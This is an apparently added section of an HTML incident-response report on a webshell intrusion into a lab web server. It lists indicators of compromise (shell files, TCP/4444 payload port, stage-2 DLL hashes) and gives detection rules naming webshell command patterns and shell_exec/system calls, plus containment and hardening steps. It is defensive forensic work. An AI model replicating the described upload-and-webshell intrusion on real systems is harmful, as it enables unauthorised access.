+<td><code>/uploads/exploit.php</code>, <code>/uploads/shell.php</code></td>
+<td>shells on disk</td>
+</tr>
+<tr>
+<td>Port</td>
+<td>TCP/4444</td>
+<td>payload delivery</td>
+</tr>
+<tr>
+<td>CSRF token</td>
+<td><code>d985dd65f4e8a1dc18f2f3b2cd3f128c068b4979efc4545e9082252df52b8503</code></td>
+<td>upload body (session-specific)</td>
+</tr>
+<tr>
+<td>Session</td>
+<td><code>PHPSESSID=4f21e6caa9f18e454c2f4f9eead6e277</code></td>
+<td>attacker session</td>
+</tr>
+</tbody>
+</table>
+<h3>Host</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User agent</td>
+<td><code>curl/8.5.0</code> (all 17 requests)</td>
+</tr>
+<tr>
+<td>User agent</td>
+<td><code>Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)</code></td>
+</tr>
+<tr>
+<td>File</td>
+<td><code>/var/www/blackstone/uploads/shell.php</code> — 135 B, SHA-256 below</td>
+</tr>
+<tr>
+<td>File</td>
+<td><code>/var/www/blackstone/uploads/exploit.php</code> — 223 B</td>
+</tr>
+<tr>
+<td>File</td>
+<td>stage-2 DLL 255,676 B — <code>f274bc45…346e</code>, <code>915e6ca9…fa16f</code></td>
+</tr>
+<tr>
+<td>Packer marker</td>
+<td><code>MZARUH</code> stub, <code>inflate 1.0.4</code> / <code>deflate 1.0.4</code> strings</td>
+</tr>
+<tr>
+<td>PE export</td>
+<td><code>server.dll</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>shell.php</code> body (135 bytes as served) SHA-256: <code>851bf02112458d234ceb82c2cef033623c2aa4ebb44a0a246c08afac8ccf499a</code>.
+Stage-2 DLLs and all sample hashes are listed in <code>Evidence/Samples/SHA256SUMS.txt</code>.</p>
+<hr />
+<h2>9. Detection and recommendations</h2>
+<p><strong>Immediate (containment)</strong></p>
+<ol>
+<li>Remove <code>shell.php</code> and <code>exploit.php</code> from <code>/var/www/blackstone/uploads/</code>; disable PHP execution in upload directories (<code>php_admin_flag engine off</code>) and move uploads outside the document root.</li>
+<li>Rotate credentials/sessions and audit <code>upload.php</code> (19,989 B, modified 08:51 on 11-08) for the injected/skipped validation logic.</li>
+<li>Hunt <code>wazuh-server</code> for the SUID/<code>find</code>/<code>sudo -l</code> commands and for outbound TCP/4444; check Wazuh agent logs around 09:29 GMT.</li>
+<li>Isolate/forensically image <code>192.168.1.13</code> and <code>192.168.1.120</code>; hash and detonate the extracted DLL in a sandbox; pull autoruns, services and <code>svchost</code> injection artefacts.</li>
+</ol>
+<p><strong>Detection content</strong></p>
+<table>
+<thead>
+<tr>
+<th>Telemetry</th>
+<th>Rule idea</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache access log</td>
+<td><code>POST /upload.php</code> followed within 60 s by <code>GET /uploads/*.php?cmd=</code> from the same client → critical alert</td>
+</tr>
+<tr>
+<td>Web server / Wazuh FIM</td>
+<td>new <code>.php</code> in an upload directory → critical; <code>shell_exec</code>/<code>system</code>/<code>passthru</code> in web root</td>
+</tr>
+<tr>
+<td>Firewall / NetFlow</td>
+<td>&gt;100 unique destination ports per source in 10 s; full-port sweep &gt;1,000 pps</td>
+</tr>
+<tr>
+<td>Firewall</td>
+<td>any outbound TCP/4444; any host contacting a bare IP:443 without SNI</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td>≥10 NXDOMAIN for distinct domains from one host in 60 s (DGA score); block 8.8.8.8 direct egress</td>
+</tr>
+<tr>
+<td>Proxy/TLS</td>
+<td>PE download over non-HTTP channels; <code>MZ</code> magic in unexpected streams</td>
+</tr>
+<tr>
+<td>EDR</td>
+<td>unsigned DLL export <code>server.dll</code>, <code>SeDebugPrivilege</code> acquisition, <code>WinHttpOpen</code> from a non-browser process</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Hardening</strong></p>
+<ul>
+<li>Enforce upload allow-lists by MIME + magic bytes, randomise stored filenames, store outside web root.</li>
+<li>Segment the lab: no host should reach 8.8.8.8 directly; force internal resolvers with RPZ/sinkhole for DGA.</li>
+<li>Restrict Wazuh ports 1514/1515/55000 to manager/agent networks only.</li>
+<li>Add TTL/IP-ID anomaly detection on the IDS to catch randomised scanners.</li>
+</ul>
+<hr />
+<h2>10. Limitations</h2>
+<ul>
+<li>Zeek and Suricata were unavailable; no protocol-level logs or IDS verdicts were produced.</li>
+<li>All payloads are encrypted or packed; no dynamic analysis was performed (deliberately). Packer identification is static and therefore <em>Likely</em>, not Confirmed.</li>
+<li><code>C2+DGA</code> contains loopback and user-browsing traffic; attribution of process-to-flow requires host telemetry not present in the capture.</li>
+<li>192.168.1.13 and 192.168.1.120 share a MAC, which prevents definitive attacker/victim assignment from packets alone.</li>
+<li>The 102.132.97.54 TLS session begins mid-stream (no ClientHello), so SNI/certificate could not be extracted.</li>
+<li>Capture clocks: the captures are timestamped in local time (EET, UTC+2); the webshell HTTP <code>Date</code> header (09:29:41 GMT) confirms the offset. Sections 4–6 quote relative offsets from each capture's first packet; absolute timestamps in §1, §7 and <code>Timeline.csv</code> are converted to UTC (local − 2 h).</li>
+</ul>
+<hr />
+<h2>11. Appendix</h2>
+<ul>
+<li><code>Evidence/commands-and-filters.md</code> — every command and display filter used.</li>
+<li><code>Evidence/webshell-command-transcript.md</code> — request/response transcript of the 15 commands.</li>
+<li><code>Evidence/Samples/</code> — inert extracts: <code>shell.php</code>, two DLL builds, <code>SHA256SUMS.txt</code>.</li>
+<li><code>Timeline.csv</code>, <code>IOCs.csv</code> — machine-readable.</li>
+</ul></body></html>
